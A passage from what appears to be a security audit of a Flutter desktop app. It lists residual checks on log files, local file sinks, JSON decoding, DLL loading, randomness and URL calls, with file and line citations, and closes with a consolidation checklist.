- Log files read back and acted on (log injection) — none. Every log is only displayed in its Dev tile or cleared. `JournalDebugLogger` re-reads its own file only to prune by the `=== APP START ===` marker (`lib/core/dev/journal_debug_logger.dart:95-108`). `PerfStallLogger` acts only on whether a marker file exists (`lib/core/dev/perf_stall_logger.dart:75-78`). All logs live in the per-user Documents dir (`error_logger.dart:150-151`, `sync_compare_logger.dart:15-18`), so planting or reading them needs the same Windows user (Section 11).
- Residual file sinks (`lib/features/finance/finance_ui_prefs.dart:146,169`; `lib/features/jobs/jobs_track_draft_store.dart:27,44`; `lib/features/leetcode/leetcode_track_draft_store.dart:26,43`; `lib/features/leetcode/leetcode_scratch_host.dart:297-298`) — fixed file names under per-user app directories, device-local, never synced or restored. Contents are `jsonDecode`d into plain maps and read into typed drafts/prefs, with no path, URL or process field (Section 12).
- Residual `jsonDecode` sites in domain models/services (`lib/domain/models/job_models.dart:44`, `workout_models.dart:426,446`, `lib/domain/services/character_operation.dart:53,221`, `character_sequence_crdt_merger.dart:199`) — plain maps/lists read with `as` casts into fixed types, with no type-name dispatch. A malformed value only throws (same result as Section 5) (Section 12).
- FFI library loading (`lib/core/caps_lock/caps_lock_state.dart:168-170`; `lib/core/platform/windows_keyboard_workaround.dart:233`) — loads `user32.dll` by name. It is a KnownDLL, so the loader never searches the app dir for it, and there's no DLL planting (Section 12).
- Non-cryptographic `Random()` (`lib/core/sync/sync_engine.dart:243`; `lib/app/providers.dart:1294`; SRS shuffles in `lib/domain/services/study_srs_engine.dart:143,164`, `leetcode_srs_engine.dart:114,136`; `quote_bank.dart:20`; UI/painter seeds) — none of them protects anything. The sync-engine value is a local id suffix, not a secret, and remote access is gated by the rules (Section 1). The only security-relevant randomness is the OAuth PKCE verifier, which uses `Random.secure()` (Section 2) (Section 12).
- Secret/token comparisons — none in `lib/`. The only `==` hits on token/hash/signature names are editor tokens, a widget cache key and a reminder-alert dedupe signature (`lib/core/widgets/tag_suggestion_overlay.dart:190`; `lib/core/media/widgets/media_image.dart:72`; `lib/core/reminders/reminder_engine.dart:356`). The hash checks in import compare locally computed SHA-256s, where timing is irrelevant (Section 12).
- Other residual `launchUrl`/`Uri.parse`/`http` sites — all constants or already covered: `settings_page.dart:900-901` (fixed OpenWeather link), `desktop_google_oauth.dart:13-21,63` (Section 2), the LeetCode, jobs and callable client (Sections 3 and 9). No `http` call in `lib/domain`, `lib/features` or `lib/core` outside those (Section 12).

## Final Consolidation

- [x] All open Cross-Section Leads processed
- [x] Duplicate findings merged
- [x] Findings sorted by severity
- [x] Summary written at top of file
